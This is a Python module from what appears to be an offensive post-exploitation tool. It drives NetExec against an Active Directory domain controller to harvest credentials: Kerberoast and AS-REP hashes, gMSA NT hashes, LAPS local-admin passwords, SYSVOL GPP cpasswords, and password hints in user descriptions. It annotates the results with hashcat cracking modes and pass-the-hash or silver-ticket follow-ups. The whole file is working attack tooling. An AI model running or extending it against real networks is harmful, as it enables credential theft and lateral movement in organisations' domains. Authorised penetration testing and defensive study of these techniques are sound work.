"""Phase 2 - the Active Directory side, looted with one domain credential against
a DC: GPP passwords, AD descriptions, LAPS, gMSA, Kerberoast, AS-REP. Via nxc."""
from __future__ import annotations

import re
from typing import List

from core.credential import Credential
from core.secret import Secret, Status
from core.tools import find_tool, run, strip_ansi
from .base import BaseCollector

KRB_TGS = re.compile(r"\$krb5tgs\$[^\s'\"]+")
KRB_ASREP = re.compile(r"\$krb5asrep\$[^\s'\"]+")
NXC_LINE = re.compile(r"^\s*\S+\s+\S+\s+\d+\s+\S+\s+(.*)$")


class _AdNxc(BaseCollector):
    per_credential = False
    requires = ("nxc",)
    needs_ldap = True            # AD loot only makes sense against a DC
    proto = "ldap"
    extra: List[str] = []
    kdc = False                  # True = pin the KDC to the target (roasting)

    def collect_once(self, cred: Credential) -> List[Secret]:
        bin_ = find_tool("nxc")
        if not bin_:
            return []
        cmd = [bin_, self.proto, self.host] + cred.nxc_auth_args() + self.extra
        if self.kdc:
            cmd += ["--kdcHost", self.host]
        res = run(cmd, timeout=self.timeout, raw_dir=self.raw_dir,
                  raw_name=self._raw_name(cred))
        return self._parse(strip_ansi(res.output))

    def _messages(self, out: str) -> List[str]:
        return [m.group(1).strip() for line in out.splitlines()
                if (m := NXC_LINE.match(line))]

    def _parse(self, out: str) -> List[Secret]:
        return []


class KerberoastCollector(_AdNxc):
    name = "Kerberoast"; proto = "ldap"; extra = ["--kerberoasting", "/dev/stdout"]
    kdc = True
    description = "Kerberoastable SPN accounts (TGS hashes)"

    def _parse(self, out: str) -> List[Secret]:
        found = []
        for h in set(KRB_TGS.findall(out)):
            user = h.split("$")[3].split("/")[0] if h.count("$") >= 3 else ""
            found.append(Secret(self.host, "Kerberoast", user, h, Status.HASH,
                                secret_type="krb5tgs", notes="crack: hashcat -m 13100"))
        return found


class AsrepRoastCollector(_AdNxc):
    name = "ASREPRoast"; proto = "ldap"; extra = ["--asreproast", "/dev/stdout"]
    kdc = True
    description = "AS-REP roastable users (no preauth)"

    def _parse(self, out: str) -> List[Secret]:
        found = []
        for h in set(KRB_ASREP.findall(out)):
            user = h.split("$")[3].split("@")[0] if h.count("$") >= 3 else ""
            found.append(Secret(self.host, "ASREPRoast", user, h, Status.HASH,
                                secret_type="krb5asrep", notes="crack: hashcat -m 18200"))
        return found


class GmsaCollector(_AdNxc):
    name = "gMSA"; proto = "ldap"; extra = ["--gmsa"]
    description = "gMSA managed passwords (needs ReadGMSAPassword)"

    def _parse(self, out: str) -> List[Secret]:
        found = []
        for msg in self._messages(out):
            m = re.search(r"Account:\s*(\S+)\s+NTLM:\s*([0-9a-fA-F]{32})", msg)
            if m:
                found.append(Secret(self.host, "gMSA", m.group(1), m.group(2),
                                    Status.HASH, secret_type="nthash",
                                    notes="gMSA NT hash; PtH / silver ticket"))
                continue
            mi = re.search(r"Account:\s*(\S+).*no read permissions.*"
                           r"PrincipalsAllowedToReadPassword:\s*(.+)$", msg, re.I)
            if mi:
                found.append(Secret(self.host, "gMSA", mi.group(1).rstrip("$"),
                                    "", Status.INFO, secret_type="gmsa",
                                    target=mi.group(2).strip(),
                                    notes="readable by -> compromise that principal"))
        return found


class LapsCollector(_AdNxc):
    name = "LAPS"; proto = "ldap"; extra = ["-M", "laps"]
    description = "LAPS local-admin passwords (needs read rights)"

    def _parse(self, out: str) -> List[Secret]:
        found = []
        for msg in self._messages(out):
            m = re.search(r"(?:Computer|Host|Name):\s*(\S+).*?(?:Password):\s*(\S+)", msg, re.I)
            if m:
                found.append(Secret(self.host, "LAPS", m.group(1), m.group(2),
                                    Status.CLEARTEXT, secret_type="password",
                                    target=m.group(1), notes="local admin pw"))
        return found


class DescriptionsCollector(_AdNxc):
    name = "ADDesc"; proto = "ldap"; extra = ["-M", "get-desc-users"]
    description = "AD user description / password fields"

    HINT = re.compile(r"(pass|pwd|passwort|cred|secret|login|pw\s*[:=]|"
                      r"[:=]\s*\S*\d\S*[A-Za-z]|!|@)", re.I)
    NOISE = re.compile(r"built-in account|key distribution|managed service|"
                       r"guest access", re.I)

    def _parse(self, out: str) -> List[Secret]:
        found = []
        for msg in self._messages(out):
            low = msg.lower()
            if "description:" not in low or self.NOISE.search(msg):
                continue
            desc = msg.split("description:", 1)[1].strip()
            if desc and self.HINT.search(desc):
                user = ""
                mu = re.search(r"User:\s*(\S+)", msg)
                if mu:
                    user = mu.group(1)
                found.append(Secret(self.host, "ADDesc", user, desc[:120], Status.INFO,
                                    secret_type="description",
                                    notes="description may hold a credential"))
        return found


class GppCollector(_AdNxc):
    name = "GPP"; proto = "smb"; extra = ["-M", "gpp_password"]
    needs_ldap = True
    description = "SYSVOL GPP cpassword (Groups.xml etc.)"

    def _parse(self, out: str) -> List[Secret]:
        found = []
        user = pw = None
        for msg in self._messages(out):
            mu = re.search(r"(?:userName|Username|user)[:\s]+(\S+)", msg, re.I)
            mp = re.search(r"(?:Password|cpassword)[:\s]+(\S+)", msg, re.I)
            if mu:
                user = mu.group(1)
            if mp:
                pw = mp.group(1)
            if user and pw:
                found.append(Secret(self.host, "GPP", user, pw, Status.CLEARTEXT,
                                    secret_type="password", notes="SYSVOL GPP"))
                user = pw = None
        return found
